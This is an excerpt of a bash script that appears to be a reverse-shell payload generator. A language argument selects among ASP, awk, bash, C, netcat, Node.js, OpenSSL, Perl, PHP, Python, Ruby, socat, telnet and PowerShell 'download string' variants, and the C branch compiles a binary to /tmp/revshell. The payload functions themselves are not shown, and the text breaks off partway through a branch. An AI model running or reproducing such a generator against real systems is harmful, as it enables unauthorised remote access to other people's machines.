...
function _list_(){
	...
	printf "[${COL_BLUE}+${COL_END}] ps1-ds  (download string)\n"
...
then
        printf "==========[ ${COL_BLUE}PHP WEB SIMPLE${COL_END} ]==========\n\n"
	_php_web_simple_ "$1"
	exit
fi
...
if [[ "$1" == "asp" ]];
then
        printf "==========[ ${COL_BLUE}ASP${COL_END} ]==========\n\n"
        _asp_ "$1" "$2" "$3"

elif [[ "$1" == "awk" ]];
then
	printf "==========[ ${COL_BLUE}AWK${COL_END} ]==========\n\n"
	_awk_ "$1" "$2" "$3"

elif [[ "$1" == "bash" ]];
then
	printf "==========[ ${COL_BLUE}BASH${COL_END} ]==========\n\n"
	_bash_ "$1" "$2" "$3"

elif [[ "$1" == "c" ]] || [[ "$1" == "C" ]];
then
	printf "==========[ ${COL_BLUE}C${COL_END} ]==========\n\n"
	_c_ "$1" "$2" "$3"
        gcc /tmp/Cprog.c -o /tmp/revshell
        cat /tmp/Cprog.c
	printf "[${COL_YELLOW}+${COL_END}] Binary file is already compiled and stored in /tmp/revshell\n"


elif [[ "$1" == "cpan" ]];
then
	printf "==========[ ${COL_BLUE}CPAN${COL_END} ]==========\n\n"
        _cpan_ "$1" "$2" "$3"

elif [[ "$1" == "dart" ]];
then
        printf "==========[ ${COL_BLUE}DART${COL_END} ]==========\n\n"
        _dart_linux_ "$1" "$2" "$3"

elif [[ "$1" == "gawk" ]];
then
	printf "==========[ ${COL_BLUE}GAWK${COL_END} ]==========\n\n"
        _gawk_ "$1" "$2" "$3"

elif [[ "$1" == "golang" ]] || [[ "$1" == "go" ]] || [[ "$1" == "GOLANG" ]] || [[ "$1" == "GO" ]];
then
	printf "==========[ ${COL_BLUE}GO${COL_END} ]==========\n\n"
        _golang_ "$1" "$2" "$3"

elif [[ "$1" == "groovy" ]];
then
        printf "==========[ ${COL_BLUE}GROOVY${COL_END} ]==========\n\n"
        _groovy_linux_ "$1" "$2" "$3"

elif [[ "$1" == "java" ]];
then
	printf "==========[ ${COL_BLUE}JAVA${COL_END} ]==========\n\n"
        _java_ "$1" "$2" "$3"

elif [[ "$1" == "lua" ]];
then
        printf "==========[ ${COL_BLUE}LUA${COL_END} ]==========\n\n"
        _lua_linux_ "$1" "$2" "$3"


elif [[ "$1" == "nc" ]];
then
	printf "==========[ ${COL_BLUE}NETCAT${COL_END} ]==========\n\n"
        _netcat_ "$1" "$2" "$3"
	printf "==========[ ${COL_BLUE}NETCAT WITHOUT -e FLAG${COL_END} ]==========\n\n"
	_netcat_without_e_flag_ "$1" "$2" "$3"


elif [[ "$1" == "nodejs" ]];
then
	printf "==========[ ${COL_BLUE}NODEJS${COL_END} ]==========\n\n"
        _nodejs_ "$1" "$2" "$3"


elif [[ "$1" == "openssl" ]];
then
        printf "==========[ ${COL_BLUE}OPENSSL${COL_END} ]==========\n\n"
        _openssl_ "$1" "$2" "$3"

elif [[ "$1" == "perl" ]];
then
	printf "==========[ ${COL_BLUE}PERL${COL_END} ]==========\n\n"
        _perl_ "$1" "$2" "$3"

elif [[ "$1" == "php" ]];
then
	printf "==========[ ${COL_BLUE}PHP${COL_END} ]==========\n\n"
        _php_ "$1" "$2" "$3"

elif [[ "$1" == "php-daemon" ]];
then
        printf "==========[ ${COL_BLUE}PHP WEB DAEMON${COL_END} ]==========\n\n"
        _php_web_daemon_ "$1" "$2" "$3"

elif [[ "$1" == "python" ]];
then
	printf "==========[ ${COL_BLUE}PYTHON${COL_END} ]==========\n\n"
        _python_ "$1" "$2" "$3"


elif [[ "$1" == "ruby" ]];
then
	printf "==========[ ${COL_BLUE}RUBY${COL_END} ]==========\n\n"
        _ruby_ "$1" "$2" "$3"


elif [[ "$1" == "sbd" ]];
then
        printf "==========[ ${COL_BLUE}SBD${COL_END} ]==========\n\n"
        _sbd_ "$1" "$2" "$3"


elif [[ "$1" == "socat" ]];
then
	printf "==========[ ${COL_BLUE}SOCAT${COL_END} ]==========\n\n"
        _socat_ "$1" "$2" "$3"


elif [[ "$1" == "telnet" ]];
then
        printf "==========[ ${COL_BLUE}TELNET${COL_END} ]==========\n\n"
	_telnet_ "$1" "$2" "$3" "$4"

elif [[ "$1" == "ps1" ]];
then
	printf "==========[ ${COL_BLUE}PS1${COL_END} ]==========\n\n"
        _ps1_ "$1" "$2" "$3"


elif [[ "$1" == "ps1-ds" ]];
then
        printf "==========[ ${COL_BLUE}PS1 DOWNLOAD STRING${COL_END} ]==========\n\n"
